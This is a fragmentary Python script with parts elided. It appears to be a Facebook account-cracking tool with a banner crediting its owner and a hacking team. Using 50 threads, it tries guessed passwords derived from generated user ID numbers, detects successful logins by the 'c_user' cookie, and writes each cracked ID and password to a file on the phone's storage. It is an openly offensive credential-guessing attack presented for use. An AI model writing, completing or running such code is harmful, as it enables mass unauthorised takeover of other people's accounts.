...
logo = ("""
 \033[1;96m .o88b. db    db d8888b. d88888b d8888b. 
 \033[1;97m8P  Y8 `8b  d8' 88  `8D 88'     88  `8D 
 \033[1;95m8P       `8bd8'  88oooY' 88ooooo 88oobY' 
 \033[1;94m8b         88    88~~~b. 88~~~~~ 88`8b   
 \033[1;93m8b  d8    88    88   8D 88.     88 `88. 
 \033[1;92m `Y88P'    YP    Y8888P' Y88888P 88   YD   
 \033[1;93m╔═════════════════[\033[1;32m 𝘼𝘿𝙈𝙄𝙉 𝙄𝙉-𝙁𝙍𝙊 \033[1;32m]══════════════╗
 \033[1;93m║     \033[1;96m[✓] owner\33[0;m   : \033[1;96m Shohag-Khan     \033[1;32m
 ...
 \033[1;93m║     \033[1;35m[✓] TEAM         :  \033[1;35  𝐇𝐞𝐥𝐥𝐨 𝐇𝐚𝐜𝐤𝐞𝐫,𝐬 𝟎.𝟐🇧🇩 \033[1;32m 
 \033[1;93m║     \033[1;36m[✓] TOOL VIRSION :  \033[1;36m3.0                  \033[1;32m 
 \033[1;93m║᯽⊱┈──╌❊❊╌──┈⊰᯽⊱⊰᯽⊱┈──╌❊❊╌──┈⊰᯽⊱⊰᯽⊱┈─╌❊❊╌──┈⊰᯽⊱ \033[1;32m
...
def riddu():
    ...
    with ThreadPool(max_workers=50) as manshera:
        ...
        print(f' \033[1;91m[\033[1;97m•\033[1;91m]\033[1;94m TOOL OWNER \033[1;97m: \033[1;96m SHOHAG KHAN')
        ...
        print(f' \033[1;91m[\033[1;97m•\033[1;91m]\033[1;92m Tool Work = DATA & WIFI ')
        print(f" \033[1;93m×××××××××××××××××××××××××××××××××××××××××××××××××")
        for love in user:
            pwx = [love[1:]]
            uid = code+love
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                #print('\r\r\033[1;32m[CYBER-CP💔] ' +uid+ ' | ' +ps+           '  \33[0;92m')
                open('/sdcard/SHOHAG-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
